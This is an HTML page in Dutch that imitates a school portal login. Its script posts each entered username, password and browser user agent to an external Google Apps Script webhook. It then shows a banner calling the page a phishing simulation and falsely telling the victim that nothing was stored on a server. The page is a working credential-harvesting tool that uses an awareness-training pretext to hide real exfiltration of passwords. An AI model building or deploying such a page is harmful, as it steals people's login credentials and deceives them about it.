<!DOCTYPE html>
<html lang="nl">
<head>
  <meta charset="UTF-8">
  <title>Login Portaal</title>
  <style>
    body { background-color: #111; color: #0f0; font-family: monospace; text-align: center; margin-top: 100px; }
    input, button { padding: 10px; margin: 10px; background: #222; color: #0f0; border: none; }
  </style>
</head>
<body>
  <h2>Login bij Schoolportaal</h2>
  <form id="loginForm">
    <input type="text" id="username" placeholder="Gebruikersnaam" required><br>
    <input type="password" id="password" placeholder="Wachtwoord" required><br>
    <button type="submit">Inloggen</button>
  </form>

  <div id="result" style="display:none; margin-top: 20px;">
    <h3 style="color:red;">⚠️ Phishing Simulatie ⚠️</h3>
    <p>Je gegevens zijn niet echt opgeslagen op een server.<br>Dit was een test om je bewust te maken van online phishing.</p>
  </div>

  <script>
    const webhookURL = "https://script.google.com/macros/s/AKfycbzHHDjulEcUAHwGyj2b87IdQttDnK_nbW-a8sdgRuGOcgAHvYm09RPDkQyPghcDA91D/exec"; // <-- plak jouw Apps Script URL hier

    document.getElementById("loginForm").addEventListener("submit", function(e) {
      e.preventDefault();

      const username = document.getElementById("username").value;
      const password = document.getElementById("password").value;
      const userAgent = navigator.userAgent;

      fetch(webhookURL, {
        method: "POST",
        body: JSON.stringify({ username, password, userAgent }),
        headers: { "Content-Type": "application/json" }
      });

      document.getElementById("loginForm").style.display = "none";
      document.getElementById("result").style.display = "block";
    });
  </script>
</body>
</html>
